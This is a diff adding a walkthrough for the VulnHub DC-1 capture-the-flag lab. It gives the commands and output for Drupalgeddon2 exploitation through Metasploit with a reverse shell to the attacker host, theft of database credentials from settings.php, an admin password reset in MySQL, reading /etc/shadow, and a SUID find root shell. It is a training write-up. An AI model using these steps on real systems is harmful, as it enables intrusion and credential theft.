@@ -1,0 +1,245 @@
+# VulnHub DC-1 Walkthrough
+
+![VulnHub](https://img.shields.io/badge/VulnHub-DC--1-blue)
+![Drupal](https://img.shields.io/badge/CMS-Drupal%207-orange)
+![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
+
+A step-by-step guide to rooting **DC-1** from VulnHub. This machine focuses on Drupal exploitation and basic Linux privilege escalation.
+
+---
+
+## Table of Contents
+- [Lab Setup](#lab-setup)
+- [Network Discovery](#network-discovery)
+- [Enumeration](#enumeration)
+- [Exploitation](#exploitation)
+  - [Drupalgeddon2 (CVE-2018-7600)](#drupalgeddon2-cve-2018-7600)
+  - [Shell Stabilisation](#shell-stabilisation)
+- [Post-Exploitation & Flag Hunting](#post-exploitation--flag-hunting)
+  - [Flag 1](#flag-1)
+  - [Flag 2](#flag-2)
+  - [Flag 3](#flag-3)
+  - [Flag 4](#flag-4)
+- [Privilege Escalation to Root](#privilege-escalation-to-root)
+- [Final Flag](#final-flag)
+- [Flags Summary](#flags-summary)
+- [Conclusion](#conclusion)
+
+---
+
+## Lab Setup
+
+- **Attacker Machine**: Kali Linux (IP: `192.168.56.100`)
+- **Target Machine**: DC-1 (IP: `192.168.56.101`)
+- **Network Configuration**: Both VMs set to **Host-Only Adapter** in VirtualBox.
+
+---
+
+## Network Discovery
+
+After starting both VMs, discover the target's IP using `netdiscover`:
+
+```bash
+sudo netdiscover -i eth0
+Output:
+
+text
+ IP            At MAC Address     Count  Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------
+ 192.168.56.1    0a:00:27:00:00:00   1    60  Unknown vendor                   
+ 192.168.56.100  08:00:27:3c:4a:2e   1    60  PCS Systemtechnik GmbH           
+ 192.168.56.101  08:00:27:21:6c:e0   2   120  PCS Systemtechnik GmbH           
+ 192.168.111.1   0a:00:27:00:00:00   1    60  Unknown vendor
+Target IP: 192.168.56.101
+
+Enumeration
+Run a comprehensive Nmap scan:
+
+bash
+nmap -sC -sV -p- 192.168.56.101
+Key Findings:
+
+Port 22 – OpenSSH 6.0p1 (Debian)
+
+Port 80 – Apache httpd 2.2.22 (Debian)
+
+Port 111 – rpcbind
+
+HTTP Title: Drupal Site
+
+HTTP Generator: Drupal 7 (http://drupal.org)
+
+robots.txt reveals many entries, including /CHANGELOG.txt
+
+The presence of Drupal 7 is a strong indicator of potential RCE vulnerabilities.
+
+Exploitation
+Drupalgeddon2 (CVE-2018-7600)
+Drupal 7 is susceptible to Drupalgeddon2, an unauthenticated remote code execution vulnerability. We use Metasploit's module for a reliable reverse shell.
+
+Launch Metasploit:
+
+bash
+msfconsole
+Configure the exploit:
+
+msf
+use unix/webapp/drupal_drupalgeddon2
+set RHOSTS 192.168.56.101
+set LHOST 192.168.56.100      # Your Kali IP
+set LPORT 4444
+run
+Receive Meterpreter session:
+
+text
+[*] Meterpreter session 1 opened (192.168.56.100:4444 -> 192.168.56.101:50978)
+Shell Stabilisation
+Drop into a system shell and upgrade it using Python (since Python 2 is available):
+
+meterpreter
+shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+Now you have a stable interactive shell as www-data.
+
+Post-Exploitation & Flag Hunting
+Flag 1
+Navigate to the web root:
+
+bash
+cd /var/www
+ls -la
+cat flag1.txt
+Output:
+
+text
+Every good CMS needs a config file - and so do you.
+✅ Flag1 obtained. The hint points toward Drupal's configuration file.
+
+Flag 2
+Examine Drupal's settings file for database credentials:
+
+bash
+cat /var/www/sites/default/settings.php | grep -A 10 "databases"
+Credentials:
+
+php
+'database' => 'drupaldb',
+'username' => 'dbuser',
+'password' => 'R0ck3t',
+The actual Flag2 is the Drupal admin password. You can either:
+
+Crack the hash from the database (would take too long on a typical VM), OR
+
+Reset the password directly (faster and practical).
+
+Resetting the admin password:
+
+Generate a new Drupal 7 hash using the built-in script:
+
+bash
+cd /var/www
+php scripts/password-hash.sh '123456'
+Output:
+
+text
+password: 123456                hash: $S$DwPjF8BALZEmDp.qumhJV6WmDISclkh3bqnVPrioVPfq5ugR3djz
+Log into MySQL and update the admin user:
+
+bash
+mysql -u dbuser -p
+Enter password: R0ck3t
+
+sql
+use drupaldb;
+update users set pass='$S$DwPjF8BALZEmDp.qumhJV6WmDISclkh3bqnVPrioVPfq5ugR3djz' where name='admin';
+exit;
+Now you can log in to the Drupal web interface (http://192.168.56.101/user/login) with:
+
+Username: admin
+
+Password: 123456
+
+✅ Flag2 is essentially the ability to access the admin dashboard (or the original cracked password bubbles if you had cracked it).
+
+Flag 3
+After logging in as admin, navigate to the content section (e.g., node/3 or the default front page post). The body of the page contains:
+
+text
+Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
+✅ Flag3 obtained. The hint reveals the privilege escalation vector: SUID find.
+
+Flag 4
+Back in the shell, check for the flag4 user's home directory:
+
+bash
+cd /home/flag4
+cat flag4.txt
+Output:
+
+text
+Can you use this same method to find or access the flag in root?
+Probably. But perhaps it's not that easy. Or maybe it is?
+✅ Flag4 obtained.
+
+Privilege Escalation to Root
+Following the hint from Flag3, we locate the find binary with the SUID bit set:
+
+bash
+which find
+ls -la /usr/bin/find
+Output:
+
+text
+-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find
+The s in the owner's permissions means find executes with root privileges. We can abuse this to read the shadow file or spawn a root shell.
+
+Read /etc/shadow (optional):
+bash
+find /etc/shadow -exec cat {} \; 2>/dev/null
+Spawn a root shell:
+bash
+find . -exec /bin/sh \; -quit
+Verify:
+
+text
+# whoami
+root
+We are now root! 🎉
+
+Final Flag
+Navigate to the root home directory and retrieve the final flag:
+
+bash
+cd /root
+find /root -name "*.txt" -exec cat {} \; 2>/dev/null
+Output:
+
+text
+Well done!!!!
+
+Hopefully you've enjoyed this and learned some new skills.
+
+You can let me know what you thought of this little journey
+by contacting me via Twitter - @DCAU7
+✅ Final Flag captured.
+
+Flags Summary
+Flag	Location / How Obtained
+Flag1	/var/www/flag1.txt
+Flag2	Drupal admin password (reset to 123456 or cracked hash)
+Flag3	Drupal web content after admin login (hint about find)
+Flag4	/home/flag4/flag4.txt
+Final	/root/thefinalflag.txt (accessed via SUID find exploit)
+Conclusion
+DC-1 is an excellent beginner-friendly machine that demonstrates:
+
+Basic network discovery and enumeration.
+
+Exploitation of a well‑known CMS vulnerability (Drupalgeddon2).
+
+Credential reuse across services (database password vs. system user).
+
+Manual password reset for web application access.
+
+Privilege escalation via SUID binaries (find).
